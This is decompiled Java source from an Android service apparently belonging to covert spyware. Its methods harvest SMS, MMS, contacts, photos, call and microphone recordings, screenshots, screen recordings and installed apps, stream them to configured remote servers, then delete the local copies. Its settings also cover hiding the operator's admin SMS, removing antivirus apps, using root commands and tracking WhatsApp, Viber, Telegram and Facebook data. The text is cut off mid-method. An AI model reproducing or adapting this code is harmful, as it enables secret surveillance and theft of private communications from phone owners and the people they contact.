    //   start	length	slot	name	signature
    //   0	820	0	this	PlayService
    //   0	820	1	paramOutputStream	OutputStream
    //   123	694	2	i	int
    //   130	4	3	j	int
    //   115	519	4	l	long
    //   34	743	6	localObject1	Object
    //   120	598	7	str	String
    //   65	108	8	arrayOfString1	String[]
    //   182	414	9	arrayOfString2	String[]
    //   236	299	10	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   28	67	799	java/lang/Exception
    //   72	78	799	java/lang/Exception
    //   78	84	799	java/lang/Exception
    //   86	114	799	java/lang/Exception
    //   141	147	799	java/lang/Exception
    //   508	524	799	java/lang/Exception
    //   524	545	799	java/lang/Exception
    //   551	607	799	java/lang/Exception
    //   610	797	799	java/lang/Exception
    //   127	131	809	java/lang/Exception
    //   149	184	809	java/lang/Exception
    //   192	228	809	java/lang/Exception
    //   238	298	809	java/lang/Exception
    //   301	342	809	java/lang/Exception
    //   345	423	809	java/lang/Exception
    //   426	508	809	java/lang/Exception
  }
  
  public int ReadLabel(int paramInt)
  {
    int i = 0;
    int j = 0;
    ByteBuffer localByteBuffer = null;
    Object localObject5 = null;
    byte[] arrayOfByte = null;
    Object localObject2 = localByteBuffer;
    Object localObject1 = localObject5;
    try
    {
      String str = "label" + paramInt;
      localObject2 = localByteBuffer;
      localObject1 = localObject5;
      File localFile = new File(getFilesDir() + "/" + str);
      localObject2 = localByteBuffer;
      localObject1 = localObject5;
      FLOG("Reading label from file");
      paramInt = j;
      Object localObject4 = arrayOfByte;
      localObject2 = localByteBuffer;
      localObject1 = localObject5;
      if (localFile.exists())
      {
        paramInt = j;
        localObject4 = arrayOfByte;
        localObject2 = localByteBuffer;
        localObject1 = localObject5;
        if (localFile.length() > 0L)
        {
          localObject2 = localByteBuffer;
          localObject1 = localObject5;
          FLOG("file exists, size=" + localFile.length());
          localObject2 = localByteBuffer;
          localObject1 = localObject5;
          arrayOfByte = new byte[4];
          localObject2 = localByteBuffer;
          localObject1 = localObject5;
          localObject4 = openFileInput(str);
          localObject2 = localObject4;
          localObject1 = localObject4;
          ((FileInputStream)localObject4).read(arrayOfByte, 0, ((FileInputStream)localObject4).available());
          localObject2 = localObject4;
          localObject1 = localObject4;
          localByteBuffer = ByteBuffer.wrap(arrayOfByte);
          localObject2 = localObject4;
          localObject1 = localObject4;
          localByteBuffer.order(null);
          localObject2 = localObject4;
          localObject1 = localObject4;
          paramInt = localByteBuffer.getInt();
        }
      }
      i = paramInt;
      if (localObject4 != null) {}
      return paramInt;
    }
    catch (Exception localException)
    {
      do
      {
        localException = localException;
        localObject1 = localObject2;
        EXCEPT(localException, "ReadLabel");
      } while (localObject2 == null);
      try
      {
        ((FileInputStream)localObject2).close();
        return 0;
      }
      catch (IOException localIOException1)
      {
        return 0;
      }
    }
    finally
    {
      if (localIOException1 != null) {}
      try
      {
        localIOException1.close();
        throw localObject3;
      }
      catch (IOException localIOException2)
      {
        for (;;) {}
      }
    }
  }
  
  int ReadLostAudioCalls(OutputStream paramOutputStream)
  {
    if ((paramOutputStream == null) || (context == null)) {}
    for (;;)
    {
      return 0;
      FLOG("ReadLostAudioCalls();");
      if (iCallRecordState == 1)
      {
        FLOG("Recording call now, cancel pickup");
        return 0;
      }
      FLOG("mydir=" + mydir.getAbsolutePath());
      Object localObject2 = mydir.listFiles();
      if (localObject2 == null) {
        return 0;
      }
      FLOG("found " + localObject2.length + " files");
      int i = 0;
      while (i < localObject2.length)
      {
        FLOG(localObject2[i].getName());
        if ((localObject2[i].getName().startsWith("sys")) && (localObject2[i].getName().endsWith(".tmp")))
        {
          File localFile = new File(mydir + "/" + localObject2[i].getName());
          FLOG("Pick up file " + localFile.getAbsolutePath());
          try
          {
            paramOutputStream.write(105);
            AddData(paramOutputStream, "0");
            Object localObject1 = new Time();
            String str1 = localObject2[i].getName().substring(3, 7);
            String str2 = localObject2[i].getName().substring(7, 9);
            String str3 = localObject2[i].getName().substring(9, 11);
            String str4 = localObject2[i].getName().substring(11, 13);
            String str5 = localObject2[i].getName().substring(13, 15);
            localObject2 = localObject2[i].getName().substring(15, 17);
            FLOG("cur=" + (String)localObject2 + ":" + str5 + ":" + str4 + ":" + str3 + ":" + str2 + ":" + str1);
            ((Time)localObject1).set(Integer.parseInt((String)localObject2), Integer.parseInt(str5), Integer.parseInt(str4), Integer.parseInt(str3), Integer.parseInt(str2) - 1, Integer.parseInt(str1));
            localObject1 = ((Time)localObject1).toMillis(true) / 1000L;
            FLOG("lostdate=" + (String)localObject1);
            AddData(paramOutputStream, (String)localObject1);
            AddData(paramOutputStream, "0");
            AddData(paramOutputStream, "");
            AddData(paramOutputStream, "");
            AddData(paramOutputStream, "0");
            AddData(paramOutputStream, localFile.length());
            FLOG("opening stream");
            WriteFileToOutputStream(localFile, paramOutputStream);
            paramOutputStream.write(1);
            paramOutputStream.write(3);
            paramOutputStream.write(2);
            FLOG("closed, deleting");
            localFile.delete();
            return 0 + 1;
          }
          catch (Exception paramOutputStream)
          {
            for (;;)
            {
              EXCEPT(paramOutputStream, "ReadLostAudioCalls");
            }
          }
        }
        i += 1;
      }
    }
  }
  
  int ReadLostAudioListen(OutputStream paramOutputStream)
  {
    FLOG("ReadLostAudioListenCalls();");
    if (SMSReceiver.IsAudioRecording()) {
      FLOG("Recording voice now, cancel pickup");
    }
    for (;;)
    {
      return 0;
      if (context != null)
      {
        FLOG("mydir=" + mydir.getAbsolutePath());
        Object localObject = mydir.listFiles();
        if (localObject != null)
        {
          FLOG("found " + localObject.length + " files");
          int i = 0;
          while (i < localObject.length)
          {
            FLOG(localObject[i].getName());
            if ((localObject[i].getName().startsWith("miclisten")) && (localObject[i].getName().endsWith(".tmp")))
            {
              File localFile = new File(mydir + "/" + localObject[i].getName());
              FLOG("Pick up lost listen file " + localFile.getAbsolutePath());
              String str = localObject[i].getName().substring(9, localObject[i].getName().indexOf(".tmp") - 3);
              FLOG("sTime=" + str);
              try
              {
                FLOG("Fsize=" + localFile.length());
                paramOutputStream.write(118);
                AddData(paramOutputStream, localFile.length());
                FLOG("time before " + str);
                localObject = str;
                if (str.length() > 10) {
                  localObject = str.substring(0, 10);
                }
                FLOG("time after " + (String)localObject);
                AddData(paramOutputStream, (String)localObject);
                WriteFileToOutputStream(localFile, paramOutputStream);
                paramOutputStream.write(1);
                paramOutputStream.write(3);
                paramOutputStream.write(2);
                FLOG("closed, deleting");
                if (localFile.canWrite()) {
                  localFile.delete();
                } else {
                  FLOG("Can not delete file " + localFile.getAbsolutePath());
                }
              }
              catch (Exception paramOutputStream)
              {
                EXCEPT(paramOutputStream, "ReadLostAudioListen()");
              }
            }
            i += 1;
          }
        }
      }
    }
    return 0 + 1;
  }
  
  public boolean ReadMMS()
  {
    FLOG("ReadMMS");
    for (;;)
    {
      try
      {
        localCursor = getContentResolver().query(Uri.parse("content://mms-sms/conversations/"), null, " _ID > " + iLastMMSIDServer, null, " _ID ASC ");
        if (localCursor == null)
        {
          FLOG("ReadMMSList.query() failed");
          return false;
        }
        FLOG("Read " + Integer.toString(localCursor.getCount()) + " MMS messages from content (" + Integer.toString(localCursor.getColumnCount()) + " columns)");
        arrayOfString = localCursor.getColumnNames();
        i = 0;
        if (i < arrayOfString.length) {
          continue;
        }
        FLOG("MoveTo First");
        if (!localCursor.moveToFirst()) {
          break label259;
        }
      }
      catch (Exception localException)
      {
        Cursor localCursor;
        String[] arrayOfString;
        EXCEPT(localException, "Error read MMS = ");
        break label259;
        int i = 0;
        continue;
      }
      if (i >= arrayOfString.length)
      {
        if (localCursor.moveToNext()) {
          continue;
        }
        localCursor.close();
        break label259;
        FLOG(i + " Column: " + arrayOfString[i]);
        i += 1;
      }
      else
      {
        FLOG(arrayOfString[i] + "=" + localCursor.getString(i));
        i += 1;
      }
    }
    label259:
    return true;
  }
  
  public boolean ReadMMSlist(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    try
    {
      Cursor localCursor = getContentResolver().query(Uri.parse("content://mms"), null, " _ID > " + iLastMMSIDServer, null, " _ID ASC ");
      if (localCursor == null)
      {
        FLOG("ReadMMSList.query() failed");
        return false;
      }
      Log.d("backup.service", "Read " + Integer.toString(localCursor.getCount()) + " MMS messages from content (" + Integer.toString(localCursor.getColumnCount()) + " columns)");
      String[] arrayOfString = localCursor.getColumnNames();
      int i = 0;
      for (;;)
      {
        if (i >= arrayOfString.length)
        {
          if (!localCursor.moveToFirst()) {
            break;
          }
          paramGZIPOutputStream.write(106);
          do
          {
            Log.d("backup.service", localCursor.getString(localCursor.getColumnIndex("_ID")) + ":" + localCursor.getString(localCursor.getColumnIndex("address")) + ":" + localCursor.getString(localCursor.getColumnIndex("person")) + ":" + localCursor.getString(localCursor.getColumnIndex("date")) + ":" + localCursor.getString(localCursor.getColumnIndex("type")) + ":" + localCursor.getString(localCursor.getColumnIndex("body")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("_ID")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("address")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("person")));
            AddData(paramGZIPOutputStream, localCursor.getLong(localCursor.getColumnIndex("date")) / 1000L);
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("type")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("body")));
            iLastMMSIDServer = localCursor.getInt(localCursor.getColumnIndex("_ID"));
            paramGZIPOutputStream.write(3);
          } while (localCursor.moveToNext());
          paramGZIPOutputStream.write(2);
          localCursor.close();
          break;
        }
        Log.d("backup.service", i + " Column: " + arrayOfString[i]);
        i += 1;
      }
      return true;
    }
    catch (Exception paramGZIPOutputStream)
    {
      EXCEPT(paramGZIPOutputStream, "ReadMMSlist");
    }
  }
  
  public int ReadOneIntSetting(String paramString)
  {
    FLOG("ReadOneIntSetting()");
    mSettings = getSharedPreferences("backupPrefs", 3);
    return mSettings.getInt(paramString, 0);
  }
  
  public long ReadOneLongSetting(String paramString)
  {
    FLOG("ReadOneLongSetting()");
    mSettings = getSharedPreferences("backupPrefs", 3);
    return mSettings.getLong(paramString, 0L);
  }
  
  public int ReadPhoneBook(GZIPOutputStream paramGZIPOutputStream)
  {
    this.contacts = ContactsContract.Contacts.CONTENT_URI;
    Cursor localCursor = getContentResolver().query(this.contacts, null, " _ID >  " + iLastPhoneBookIDServer, null, "_id ASC LIMIT 100");
    FLOG("ReadPhoneBook()");
    int i = 0;
    int k = 0;
    int j = 0;
    if (localCursor == null) {
      return 0;
    }
    if (localCursor.moveToFirst()) {
      i = k;
    }
    try
    {
      paramGZIPOutputStream.write(103);
      i = k;
      int m = localCursor.getColumnIndex("_id");
      i = k;
      int n = localCursor.getColumnIndex("display_name");
      do
      {
        i = j;
        Object localObject = localCursor.getString(m);
        i = j;
        String str = localCursor.getString(n);
        i = j;
        AddData(paramGZIPOutputStream, (String)localObject);
        i = j;
        AddData(paramGZIPOutputStream, str);
        i = j;
        str = localCursor.getString(localCursor.getColumnIndex("has_phone_number"));
        if (str != null)
        {
          i = j;
          if (str.equals("1"))
          {
            i = j;
            localObject = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + (String)localObject, null, null);
            if (localObject != null)
            {
              i = j;
              if (((Cursor)localObject).moveToFirst()) {
                do
                {
                  i = j;
                  AddData(paramGZIPOutputStream, ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("data1")));
                  i = j;
                } while (((Cursor)localObject).moveToNext());
              }
              i = j;
              ((Cursor)localObject).close();
            }
          }
        }
        i = j;
        iLastPhoneBookIDServer = localCursor.getInt(m);
        i = j;
        paramGZIPOutputStream.write(3);
        k = j + 1;
        j = k;
        i = k;
      } while (localCursor.moveToNext());
      i = k;
      paramGZIPOutputStream.write(2);
      i = k;
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadPhoneBook ");
      }
    }
    FLOG("Red phones = " + i);
    SaveSettings();
    return 1;
  }
  
  public int ReadPictures(OutputStream paramOutputStream)
  {
    if (paramOutputStream == null) {}
    long l;
    do
    {
      return 0;
      FLOG("ReadPictures()");
      l = ReadUriImage(paramOutputStream, MediaStore.Images.Media.INTERNAL_CONTENT_URI, iLastIntPictureRed);
      FLOG("iRes=" + l);
      if (l > 0L)
      {
        iLastIntPictureRed = l;
        return 1;
      }
      l = ReadUriImage(paramOutputStream, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, iLastExtPictureRed);
      FLOG("iRes=" + l);
    } while (l <= 0L);
    iLastExtPictureRed = l;
    return 1;
  }
  
  public int ReadRunning(GZIPOutputStream paramGZIPOutputStream)
  {
    i = 0;
    int m = 0;
    k = 0;
    FLOG("ReadRunning()");
    List localList = ((ActivityManager)getSystemService("activity")).getRunningAppProcesses();
    j = m;
    for (;;)
    {
      try
      {
        localObject = getPackageManager().getInstalledApplications(128);
        j = m;
        paramGZIPOutputStream.write(120);
      }
      catch (Exception paramGZIPOutputStream)
      {
        Object localObject;
        Iterator localIterator;
        boolean bool;
        ApplicationInfo localApplicationInfo;
        StringBuilder localStringBuilder;
        EXCEPT(paramGZIPOutputStream, "ReadRunning error");
        i = j;
        continue;
        k = 0;
        continue;
        k = 0;
        continue;
        i = j;
        FLOG("ERRRO app path read!!!!!");
        continue;
      }
      try
      {
        localIterator = ((List)localObject).iterator();
        j = k;
        i = j;
        bool = localIterator.hasNext();
        if (bool) {
          continue;
        }
        i = j;
      }
      catch (Exception localException)
      {
        j = i;
        EXCEPT(localException, "xerZnaetChtoTutMojetSLuchitsya");
        continue;
      }
      j = i;
      paramGZIPOutputStream.write(2);
      FLOG("ReadRun red " + i);
      return i;
      i = j;
      localApplicationInfo = (ApplicationInfo)localIterator.next();
      i = j;
      localObject = localApplicationInfo.sourceDir.split("/");
      i = j;
      if (localObject.length <= 3) {
        continue;
      }
      k = 0;
      i = j;
      if (localObject[1].startsWith("system")) {
        k = 1;
      }
      localStringBuilder = localObject[3];
      localObject = localStringBuilder;
      i = j;
      if (localStringBuilder.length() > 4)
      {
        i = j;
        localObject = localStringBuilder.substring(0, localStringBuilder.length() - 4);
      }
      i = j;
      bool = IsRunning(localList, localApplicationInfo.packageName);
      i = j;
      localStringBuilder = new StringBuilder();
      if (k == 0) {
        continue;
      }
      k = 1;
      i = j;
      AddData(paramGZIPOutputStream, k);
      i = j;
      localStringBuilder = new StringBuilder();
      if (!bool) {
        continue;
      }
      k = 1;
      i = j;
      AddData(paramGZIPOutputStream, k);
      i = j;
      AddData(paramGZIPOutputStream, (String)localObject);
      i = j;
      AddData(paramGZIPOutputStream, localApplicationInfo.packageName);
      j += 1;
      i = j;
      paramGZIPOutputStream.write(3);
    }
  }
  
  public String ReadSMS(String paramString)
  {
    if (paramString == null) {
      return "error[41]";
    }
    paramString = getContentResolver().query(Uri.parse("content://sms"), null, " _ID = " + paramString, null, null);
    if (paramString == null) {
      return "error";
    }
    Log.d("backup.service", "Read " + Integer.toString(paramString.getCount()) + " SMS messages from content (" + Integer.toString(paramString.getColumnCount()) + " columns)");
    if (paramString.moveToFirst()) {
      return paramString.getString(paramString.getColumnIndex("body"));
    }
    return "<empty>";
  }
  
  public boolean ReadSMSLog(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadSMSLog:try = " + sSMSLOG);
    if ((sSMSLOG == null) || (sSMSLOG.length() == 0)) {
      return true;
    }
    try
    {
      arrayOfString1 = sSMSLOG.split("\\[\\*\\]\\n");
      sSMSLOG = "";
      if (arrayOfString1.length <= 0) {
        break label228;
      }
      FLOG("ReadSMSLog:yes! = " + arrayOfString1.length);
      paramGZIPOutputStream.write(110);
      i = 0;
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        String[] arrayOfString1;
        int i;
        String[] arrayOfString2;
        EXCEPT(paramGZIPOutputStream, "ReadSMSLog");
        break;
        AddData(paramGZIPOutputStream, Long.parseLong(arrayOfString2[0]) / 1000L);
        AddData(paramGZIPOutputStream, arrayOfString2[1]);
        AddData(paramGZIPOutputStream, arrayOfString2[2]);
        paramGZIPOutputStream.write(3);
        i += 1;
      }
    }
    if (i >= arrayOfString1.length) {}
    for (;;)
    {
      paramGZIPOutputStream.write(2);
      break label228;
      FLOG("L = " + arrayOfString1[i]);
      arrayOfString2 = arrayOfString1[i].split("\\<\\*\\>");
      if (arrayOfString2.length == 3) {
        break;
      }
      FLOG("ReadSMSLog:ACHTUNG error field count!");
    }
    label228:
    return true;
  }
  
  public boolean ReadSMSlist(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("SMS:try");
    try
    {
      Cursor localCursor = getContentResolver().query(SmsProvider.CONTENT_URI, null, null, null, " _ID ASC ");
      long l1 = 0L;
      long l3 = l1;
      if (localCursor != null)
      {
        FLOG("SMS:c.moveToFirst()" + localCursor.getCount());
        long l2 = l1;
        if (localCursor.moveToFirst())
        {
          FLOG("SMS:yes!");
          paramGZIPOutputStream.write(101);
          do
          {
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("smslist_id")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("number")));
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("name")));
            AddData(paramGZIPOutputStream, localCursor.getLong(localCursor.getColumnIndex("smsdate")) / 1000L);
            AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("type")));
            int j = 1;
            i = j;
            if (!bSMSAdmin)
            {
              i = j;
              if (sAdminNumber.length() > 0)
              {
                String str1 = localCursor.getString(localCursor.getColumnIndex("number"));
                String str2 = sAdminNumber;
                FLOG("SMSAdmin ? " + str1 + ":" + str2);
                i = j;
                if (str1 != null)
                {
                  i = j;
                  if (str1.equals(str2))
                  {
                    i = 0;
                    FLOG("Не пишем SMS админа!!");
                    AddData(paramGZIPOutputStream, "");
                  }
                }
              }
            }
            if (i != 0) {
              AddData(paramGZIPOutputStream, localCursor.getString(localCursor.getColumnIndex("smstext")));
            }
            l2 = l1 + 1L;
            paramGZIPOutputStream.write(3);
            l1 = l2;
          } while (localCursor.moveToNext());
          paramGZIPOutputStream.write(2);
        }
        l3 = l2;
        if (!localCursor.isClosed())
        {
          localCursor.close();
          l3 = l2;
        }
      }
      FLOG("SMS to upload: " + l3);
      int i = getContentResolver().delete(SmsProvider.CONTENT_URI, null, null);
      FLOG("ReadSMS : deleted=" + i);
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramGZIPOutputStream, "ReadSMSlist");
      }
    }
    return true;
  }
  
  public int ReadScreenRecord(OutputStream paramOutputStream)
  {
    FLOG("ReadScreenRecord");
    int i = 0;
    if (SMSReceiver.screenrec == null) {
      return 0;
    }
    SMSReceiver.StringTrike localStringTrike = SMSReceiver.screenrec.getLink();
    if (localStringTrike == null)
    {
      FLOG("No records found");
      return 0;
    }
    FLOG("RSR filename " + localStringTrike.Alfa);
    File localFile = new File(localStringTrike.Alfa);
    if ((!localFile.exists()) || (!localFile.canRead()))
    {
      FLOG("File cannot be red");
      return 0;
    }
    try
    {
      paramOutputStream.write(107);
      AddData(paramOutputStream, localFile.length());
      AddData(paramOutputStream, localStringTrike.Beta);
      AddData(paramOutputStream, localStringTrike.Beta);
      AddData(paramOutputStream, localStringTrike.Delta);
      AddData(paramOutputStream, "");
      AddData(paramOutputStream, "");
      AddData(paramOutputStream, "");
      AddData(paramOutputStream, "");
      AddData(paramOutputStream, localStringTrike.Gamma);
      AddData(paramOutputStream, "video/3gpp");
      AddData(paramOutputStream, localStringTrike.Gamma);
      WriteFileToOutputStream(localFile, paramOutputStream);
      paramOutputStream.write(1);
      paramOutputStream.write(3);
      paramOutputStream.write(2);
      i = 1;
    }
    catch (Exception paramOutputStream)
    {
      for (;;)
      {
        EXCEPT(paramOutputStream, "ReadScreenRecords");
      }
    }
    FLOG("delete file " + localFile.getAbsolutePath());
    localFile.delete();
    FLOG("return " + i);
    return i;
  }
  
  public int ReadScreenShotAdvanced(OutputStream paramOutputStream)
  {
    if ((paramOutputStream == null) || (context == null)) {}
    for (;;)
    {
      return 0;
      FLOG("ReadScreenShotAdvanced();");
      FLOG("mydir=" + mydir.getAbsolutePath());
      Object localObject = mydir.listFiles();
      if (localObject != null)
      {
        FLOG("found " + localObject.length + " files");
        int i = 0;
        while (i < localObject.length)
        {
          FLOG(localObject[i].getName());
          if ((localObject[i].getName().startsWith("screenshot")) && (localObject[i].getName().endsWith(".png")))
          {
            localObject = new File(mydir + "/" + localObject[i].getName());
            FLOG("chmod 777 " + ((File)localObject).getAbsolutePath());
            commandSU("chmod 777 " + ((File)localObject).getAbsolutePath());
            try
            {
              paramOutputStream.write(115);
              AddData(paramOutputStream, ((File)localObject).length());
              AddData(paramOutputStream, "0");
              AddData(paramOutputStream, ((File)localObject).lastModified() / 1000L);
              AddData(paramOutputStream, "0");
              AddData(paramOutputStream, "0");
              AddData(paramOutputStream, "SCREEN" + ((File)localObject).lastModified() / 1000L);
              WriteFileToOutputStream((File)localObject, paramOutputStream);
              paramOutputStream.write(1);
              paramOutputStream.write(3);
              paramOutputStream.write(2);
              ((File)localObject).delete();
              return 0 + 1;
            }
            catch (Exception paramOutputStream)
            {
              EXCEPT(paramOutputStream, "ReadScreenShotAdvanced");
              return 0;
            }
          }
          i += 1;
        }
      }
    }
  }
  
  public void ReadSettings()
  {
    FLOG("ReadSettings()");
    mSettings = getSharedPreferences("backupPrefs", 3);
    bInitialized = mSettings.getBoolean("bInitialized", false);
    if (!bInitialized)
    {
      FLOG("bInitialized == false");
      FLOG("SetDefaultSettings()");
      SetDefaultSettings();
      Log.v("backup.service", "Detect FLY ? " + DetectFly());
      SaveSettings();
      FLOG("SaveSettings()");
      return;
    }
    FLOG("Loading stored settings");
    FLOG("LSS1");
    LOGCAT = mSettings.getBoolean("LOGCAT", LOGCAT);
    iLastPhoneBookIDServer = mSettings.getLong("iLastPhoneBookIDServer", 0L);
    lLastCallListIDServer = mSettings.getLong("lLastCallListIDServer", 0L);
    lLastBrowserHistoryID = mSettings.getLong("lLastBrowserHistoryID", 0L);
    mLastBrowser44 = mSettings.getLong("mLastBrowser44", 0L);
    FLOG("LSS2");
    iLastUploadTime = mSettings.getLong("iLastUploadTime", getCurrentTime());
    iLastIntPictureRed = mSettings.getLong("iLastIntPictureRed", 0L);
    iLastExtPictureRed = mSettings.getLong("iLastExtPictureRed", 0L);
    lLastInstagram = mSettings.getLong("iLastInstagram", 0L);
    FLOG("LSS2.5");
    iLastIntVideoRed = mSettings.getLong("iLastIntVideoRed", 0L);
    iLastExtVideoRed = mSettings.getLong("iLastExtVideoRed", 0L);
    FLOG("LSS3");
    bSkipOneRootDisable = mSettings.getBoolean("bSkipOneRootDisable", false);
    lLastSMSRed = mSettings.getLong("lLastSMSRed", 0L);
    iBufferSize = mSettings.getLong("iBufferSize", 4096L);
    iMaxAudioListenFile = mSettings.getInt("iMaxAudioListenFile", iMaxAudioListenFile);
    iPauseBeforeCallRecord = mSettings.getInt("iPauseBeforeCallRecord", iPauseBeforeCallRecord);
    iCallAnswerEvent = mSettings.getInt("iCallAnswerEvent", iCallAnswerEvent);
    iSMSQueryInterval = mSettings.getLong("iSMSQueryInterval", 500L);
    iGPSCheckInterval = mSettings.getInt("iGPSCheckInterval", iGPSCheckInterval);
    iAudioSource = mSettings.getInt("iAudioSource", iAudioSource);
    iAudioFormat = mSettings.getInt("iAudioFormat", iAudioFormat);
    iCallEncoder = mSettings.getInt("iCallEncoder", iCallEncoder);
    bUseLame = mSettings.getBoolean("bUseLame", bUseLame);
    sAntivirusList = mSettings.getString("sAntivirusList", sAntivirusList);
    bRemoveAntivirus = mSettings.getBoolean("bRemoveAntivirus", bRemoveAntivirus);
    iBitRate = mSettings.getInt("iBitRate", iBitRate);
    iSamplingRate = mSettings.getInt("iSamplingRate", iSamplingRate);
    iRecAfterCall = mSettings.getInt("iRecAfterCall", iRecAfterCall);
    iTransfer = mSettings.getInt("iTransfer", iTransfer);
    iTransferBinary = mSettings.getInt("iTransferBinary", iTransferBinary);
    iTransferBinaryUnlim = mSettings.getInt("iTransferBinaryUnlim", iTransferBinaryUnlim);
    FLOG("LSS4");
    bUseWakeLock = mSettings.getBoolean("bUseWakeLock", bUseWakeLock);
    bSendLog = mSettings.getBoolean("bSendLog", bSendLog);
    bUseBlocking = mSettings.getBoolean("bUseBlocking", bUseBlocking);
    bSMSAdmin = mSettings.getBoolean("bSMSAdmin", bSMSAdmin);
    FLOG("LSS5");
    bAlreadyStarted = mSettings.getBoolean("bAlreadyStarted", bAlreadyStarted);
    bRecordCalls = mSettings.getBoolean("bRecordCalls", bRecordCalls);
    bUseRepeatControl = mSettings.getBoolean("bUseRepeatControl", bUseRepeatControl);
    bUploadGmailAttach = mSettings.getBoolean("bUploadGmailAttach", bUploadGmailAttach);
    bWork = mSettings.getBoolean("bWork", bWork);
    bRecordUnknownOnly = mSettings.getBoolean("bRecordUnknownOnly", bRecordUnknownOnly);
    bLoadPictures = mSettings.getBoolean("bLoadPictures", bLoadPictures);
    bForce3G = mSettings.getBoolean("bForce3G", bForce3G);
    bForceWIFI = mSettings.getBoolean("bForceWIFI", bForceWIFI);
    iForceGPS = mSettings.getInt("iForceGPS", iForceGPS);
    bUseMacForID = mSettings.getBoolean("bUseMacForID", bUseMacForID);
    bKnockOffScreenOnly = mSettings.getBoolean("bKnockOffScreenOnly", bKnockOffScreenOnly);
    FLOG("LSS6");
    sRecWhiteList = mSettings.getString("sRecWhiteList", sRecWhiteList);
    sRecBlackList = mSettings.getString("sRecBlackList", sRecBlackList);
    iPickup = mSettings.getInt("iPickup", iPickup);
    FLOG("Pickup=" + iPickup);
    iOldPickup = mSettings.getInt("iOldPickup", iOldPickup);
    bReportSimChange = mSettings.getBoolean("bReportSimChange", bReportSimChange);
    bRecordAdmin = mSettings.getBoolean("bRecordAdmin", bRecordAdmin);
    sSimID = mSettings.getString("sSimID", sSimID);
    FLOG("LSS7");
    iAllLogPORT = mSettings.getInt("iAllLogPORT", iAllLogPORT);
    iUDPPort = mSettings.getInt("iUDPPort", iUDPPort);
    iSMSServer_ID = mSettings.getInt("iSMSServer_ID", iSMSServer_ID);
    Object localObject = mSettings.getString("SMSServerList", SMSServerList);
    if ((SMSServerList != null) && (!((String)localObject).isEmpty())) {
      SMSServerList = (String)localObject;
    }
    FLOG("Got SMS server list: " + SMSServerList);
    localObject = SMSServerList.split(",");
    if ((localObject != null) && (localObject.length > 0) && (iSMSServer_ID < localObject.length))
    {
      SMSServer = localObject[iSMSServer_ID];
      FLOG("Chosen one SMS server: " + SMSServer);
      iServer_ID = mSettings.getInt("iServer_ID", iServer_ID);
      localObject = mSettings.getString("ServerList", ServerList);
      if ((ServerList != null) && (!((String)localObject).isEmpty())) {
        ServerList = (String)localObject;
      }
      FLOG("Got server list: " + ServerList);
      localObject = ServerList.split(":");
      if ((localObject == null) || (localObject.length <= 0) || (localObject.length != 2)) {
        break label3063;
      }
      String[] arrayOfString = localObject[0].split(",");
      if ((arrayOfString == null) || (arrayOfString.length <= 0) || (iServer_ID >= arrayOfString.length)) {
        break label3013;
      }
      Server = arrayOfString[iServer_ID];
      FLOG("Chosen one server: " + Server);
      label1375:
      localObject = localObject[1].split(",");
      if ((localObject == null) || (localObject.length <= 0) || (iPort_ID >= localObject.length)) {
        break label3038;
      }
      Port = localObject[iPort_ID];
      FLOG("Chosen one port: " + Port);
    }
    for (;;)
    {
      FLOG("LSS7.5");
      sAdminNumber = mSettings.getString("sAdminNumber", "");
      FLOG("LSS8");
      sBlockSMSList = mSettings.getString("sBlockSMSList", "");
      sBLockIPList = mSettings.getString("sBLockIPList", sBLockIPList);
      sAnswerList = mSettings.getString("sAnswerList", sAnswerList);
      sCallBlockList = mSettings.getString("sCallBlockList", "");
      sLicense = mSettings.getString("sLicense", "0000");
      iUploadInterval = mSettings.getInt("iUploadInterval", 5);
      FLOG("LSS9");
      iAudioCallSaved = mSettings.getLong("iAudioCallSaved", 0L);
      iDaysLeft = mSettings.getLong("iDaysLeft", 100L);
      lVKCounter = mSettings.getLong("lVKCounter", 0L);
      lTGCounter = mSettings.getLong("lTGCounter", 0L);
      lFBCounter = mSettings.getLong("lFBCounter", 0L);
      lOKCounter = mSettings.getLong("lOKCounter", 0L);
      lWhatsAppCounter = mSettings.getLong("lWhatsAppCounter", 0L);
      sWhatsAppPath = mSettings.getString("sWhatsAppPath", "");
      lViberCounter = mSettings.getLong("lViberCounter", 0L);
      lViberAttCounter = mSettings.getInt("lViberAttCounter", 0);
      lAgentCount = mSettings.getLong("lAgentCount", 0L);
      lWAAttCounter = mSettings.getInt("lWAAttCounter", 0);
      lTGAttCounter = mSettings.getLong("lTGAttCounter", 0L);
      lFBAttCounter = mSettings.getLong("lFBAttCounter", 0L);
      lAgentAttCounter = mSettings.getLong("lAgentAttCounter", 0L);
      lOKAttCounter = mSettings.getLong("lOKAttCounter", 0L);
      sSyncFolder = mSettings.getString("sSyncFolder", "");
      lSyncFolderLastTime = mSettings.getLong("lSyncFolderLastTime", 0L);
      sViberPath = mSettings.getString("sViberPath", "");
      FLOG("LSS9.5");
      lOperaCounter = mSettings.getLong("lOperaCounter", 0L);
      lOperaMiniCounter = mSettings.getLong("lOperaMiniCounter", 0L);
      FLOG("LSS9.6");
      iChromeCounter = mSettings.getInt("iChromeCounter", 0);
      iFirefoxCounter = mSettings.getInt("iFirefoxCounter", 0);
      iGPSTimeout = mSettings.getInt("iGPSTimeout", 300);
